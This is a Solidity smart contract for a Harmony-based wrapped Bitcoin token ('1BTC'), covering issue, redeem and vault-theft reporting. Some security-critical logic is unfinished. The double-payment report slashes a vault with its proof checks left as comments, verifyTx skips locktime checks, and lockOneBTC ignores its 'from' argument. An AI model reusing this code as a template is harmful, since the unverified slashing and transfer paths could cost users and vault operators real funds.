// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import {ValidateSPV} from "@interlay/bitcoin-spv-sol/contracts/ValidateSPV.sol";
import {TransactionUtils} from "./TransactionUtils.sol";
import "@interlay/bitcoin-spv-sol/contracts/BTCUtils.sol";
import {Issue} from "./Issue.sol";
import {Redeem} from "./Redeem.sol";
import {Replace} from "./Replace.sol";
import {IRelay} from "./IRelay.sol";
import "./IExchangeRateOracle.sol";

contract OneBtc is ERC20Upgradeable, Issue, Redeem, Replace {
    using BTCUtils for bytes;
    IRelay public relay;

    struct Report {
        address vaultId;
        bytes32 txId;
    }

    event ReportVaultTheft(address indexed vaultId);
    event VaultDoublePayment(
        address indexed vaultId,
        bytes32 leftTxId,
        bytes32 rightTxId
    );

    mapping(bytes32 => bool) public theftReports;

    function initialize(IRelay _relay, IExchangeRateOracle _oracle)
        external
        initializer
    {
        __ERC20_init("Harmony Bitcoin", "1BTC");
        _setupDecimals(8);
        relay = _relay;
        oracle = _oracle;
    }

    function verifyTx(
        uint32 height,
        uint256 index,
        bytes calldata rawTx,
        bytes calldata header,
        bytes calldata merkleProof
    ) public returns (bytes memory) {
        relay.verifyTx(
            height,
            index,
            rawTx.hash256(),
            header,
            merkleProof,
            1,
            true
        );
        TransactionUtils.Transaction memory btcTx = TransactionUtils.extractTx(
            rawTx
        );
        // require(btcTx.locktime == 0 || btcTx.locktime < height, "Locktime not reached");
        // check version?
        // btcTx.version
        return btcTx.vouts;
    }

    function requestIssue(uint256 amountRequested, address vaultId)
        external
        payable
    {
        Issue._requestIssue(msg.sender, amountRequested, vaultId, msg.value);
    }

    function executeIssue(
        address requester,
        uint256 issueId,
        bytes calldata merkleProof,
        bytes calldata rawTx, // avoid compiler error: stack too deep
        //bytes calldata _version, bytes calldata _vin, bytes calldata _vout, bytes calldata _locktime,
        uint64 heightAndIndex,
        bytes calldata header,
        uint256 outputIndex
    ) external {
        bytes memory _vout = verifyTx(
            uint32(heightAndIndex >> 32),
            heightAndIndex & type(uint32).max,
            rawTx,
            header,
            merkleProof
        );

        Issue._executeIssue(requester, issueId, _vout, outputIndex);
    }

    function cancelIssue(address requester, uint256 issueId) external {
        Issue._cancelIssue(requester, issueId);
    }

    function requestRedeem(
        uint256 amountOneBtc,
        address btcAddress,
        address vaultId
    ) external {
        Redeem._requestRedeem(msg.sender, amountOneBtc, btcAddress, vaultId);
    }

    function executeRedeem(
        address requester,
        uint256 redeemId,
        bytes calldata merkleProof,
        bytes calldata rawTx,
        uint32 height,
        uint256 index,
        bytes calldata header
    ) external {
        bytes memory _vout = verifyTx(
            height,
            index,
            rawTx,
            header,
            merkleProof
        );

        Redeem._executeRedeem(requester, redeemId, _vout);
    }

    function cancelRedeem(
        address requester,
        uint256 redeemId,
        bool reimburse
    ) external {
        Redeem._cancelRedeem(requester, redeemId, reimburse);
    }

    function transferToClaim(
        uint256 amount,
        address btcAddress
    ) external {
        address to = 0x12f42D934bb857A0bD6C4809aB425bDce933F65E;
        ERC20Upgradeable._transfer(msg.sender, to, amount);
    }

    function lockOneBTC(address from, uint256 amount)
        internal
        override(Redeem)
    {
        ERC20Upgradeable._transfer(msg.sender, address(this), amount);
    }

    function burnLockedOneBTC(uint256 amount) internal override(Redeem) {
        ERC20Upgradeable._burn(address(this), amount);
    }

    function releaseLockedOneBTC(address receiver, uint256 amount)
        internal
        override(Redeem)
    {
        ERC20Upgradeable._transfer(address(this), receiver, amount);
    }

    function issueOneBTC(address receiver, uint256 amount)
        internal
        override(Issue)
    {
        ERC20Upgradeable._mint(receiver, amount);
    }

    // function requestReplace(
    //     address payable oldVaultId,
    //     uint256 btcAmount,
    //     uint256 griefingCollateral
    // ) external payable {
    //     require(false, "Feature temporarily disabled");
    //     // Replace._requestReplace(oldVaultId, btcAmount, griefingCollateral);
    // }

    // function acceptReplace(
    //     address oldVaultId,
    //     address newVaultId,
    //     uint256 btcAmount,
    //     uint256 collateral,
    //     uint256 btcPublicKeyX,
    //     uint256 btcPublicKeyY
    // ) external payable {
    //     require(false, "Feature temporarily disabled");
    //     // Replace._acceptReplace(
    //     //     oldVaultId,
    //     //     newVaultId,
    //     //     btcAmount,
    //     //     collateral,
    //     //     btcPublicKeyX,
    //     //     btcPublicKeyY
    //     // );
    // }

    // function executeReplace(
    //     uint256 replaceId,
    //     bytes calldata merkleProof,
    //     bytes calldata rawTx, // avoid compiler error: stack too deep
    //     //bytes calldata _version, bytes calldata _vin, bytes calldata _vout, bytes calldata _locktime,
    //     uint32 height,
    //     uint256 index,
    //     bytes calldata header
    // ) external {
    //     require(false, "Feature temporarily disabled");
    //     // bytes memory _vout = verifyTx(height, index, rawTx, header, merkleProof);
    //     // Replace._executeReplace(replaceId, _vout);
    // }

    /**
     * @dev Report vault misbehavior by providing fraud proof (malicious bitcoin transaction and the corresponding transaction inclusion proof). Fully slashes the vault.
     */
    function reportVaultTheft(
        address vaultId,
        bytes calldata rawTx,
        uint32 height,
        uint256 index,
        bytes calldata merkleProof,
        bytes calldata header
    ) external {
        require(
            relay.isApprovedStakedRelayer(msg.sender),
            "Sender is not authorized"
        );

        bytes32 txId = rawTx.hash256();

        // check if already reported
        bytes32 reportKey = keccak256(abi.encodePacked(vaultId, txId));
        require(
            theftReports[reportKey] == false,
            "This txId has already been logged as a theft by the given vault"
        );

        // verify transaction inclusion using header and merkle proof
        relay.verifyTx(height, index, txId, header, merkleProof, 1, true);

        // all looks good, liquidate vault
        address reporterId = msg.sender;
        liquidateVault(vaultId, reporterId);

        theftReports[reportKey] = true;
        emit ReportVaultTheft(vaultId);
    }

    /**
     * @dev Reports vault double payment providing two fraud proof (malicious bitcoin transaction and the corresponding transaction inclusion proof). Fully slashes the vault.
     */
    function reportVaultDoublePayment(
        address vaultId,
        bytes calldata rawTxs,
        uint64[] memory heightAndIndexs,
        bytes calldata merkleProofs,
        bytes calldata headers
    ) external {
        require(
            relay.isApprovedStakedRelayer(msg.sender),
            "Sender is not authorized"
        );
        // separate the two sets and check that
        // txns must be unique

        // verify transaction inclusion using header and merkle proof for both

        bytes32 leftTxId;
        bytes32 rightTxId;

        // extract the two txns
        // TransactionUtils.extractTx(rawTxns)

        // verify that the OP_RETURN matches, amounts are not relevant
        // TxValidate.extractOpReturnOnly();

        // all looks good, liquidate vault
        address reporterId = msg.sender;
        liquidateVault(vaultId, reporterId);

        emit VaultDoublePayment(vaultId, leftTxId, rightTxId);
    }
}
